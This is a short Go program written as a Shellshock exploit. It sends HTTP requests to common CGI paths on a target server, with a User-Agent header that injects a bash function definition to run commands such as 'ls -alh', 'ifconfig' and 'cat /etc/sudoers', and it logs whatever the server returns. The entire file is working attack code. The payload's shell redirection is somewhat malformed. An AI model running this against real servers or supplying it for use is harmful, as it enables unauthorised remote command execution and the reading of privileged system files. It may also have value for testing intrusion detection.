package main

import (
	"os"
	"flag"
	"fmt"	
	"time"
	"io"
	"log"
	"net"
	"net/http"	
	"io/ioutil"
	"crypto/tls"
	"math/rand"
)

type Config struct {
	url string 
	agent string
	// lhost string
	// lport int
}

var config Config

func main() {
	//Command line switches
	var (
		url = flag.String("url", "http://127.0.0.1:80", "Target server vulnerable to shellshock")	
		agent = flag.String("ua", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0", "Default User Agent")
	)

	flag.Parse()

	config = Config{*url, *agent}

	file, _ := os.OpenFile("run.log", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
    defer file.Close()
    mw := io.MultiWriter(os.Stdout, file)
	log.SetOutput(mw)

	//add hostname as part of user agent string
	hostname, _ := os.Hostname()
	config.agent = fmt.Sprintf("%s %s", config.agent, hostname) 

	//send request to exploit shellshock
    rand.Seed(time.Now().Unix())

	NewHttpExploitRequest()
}

func NewHttpExploitRequest() {
	pages := [5]string{"/cgi-sys/entropysearch.cgi","/cgi-sys/defaultwebpage.cgi","/cgi-mod/index.cgi","/cgi-bin/test.cgi","/cgi-bin-sdb/printenv"}
	commands := [5]string{"ls -alh", "pwd", "hostname", "ifconfig", "cat /etc/sudoers"}
	
	client := httpClient()
	req, _ := http.NewRequest("GET", config.url + pages[rand.Intn(len(pages))], nil)
		
	command := commands[rand.Intn(len(commands))]
	log.Printf("Sending %s command to vulnerable server to execute", command)
	shellshockua := fmt.Sprintf("() { :;}; /bin/bash -c /bin/bash -i >& %s", command) 

	req.Header.Set("User-Agent", shellshockua)
	resp, _ := client.Do(req)

	bodyBytes, _ := ioutil.ReadAll(resp.Body)
    bodyString := string(bodyBytes)
    log.Printf("Received output: %s", bodyString)

	time.Sleep(5 * time.Second)
}

// httpClient returns a new HTTP client with appropriate timeouts set.
func httpClient() *http.Client {
	var d = &net.Dialer{
		Timeout: 5 * time.Second,
	}

	var tr = &http.Transport{
		Dial:                d.Dial,
		TLSHandshakeTimeout: 5 * time.Second,
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	return &http.Client{
		Timeout:   10 * time.Second,
		Transport: tr,
	}
}
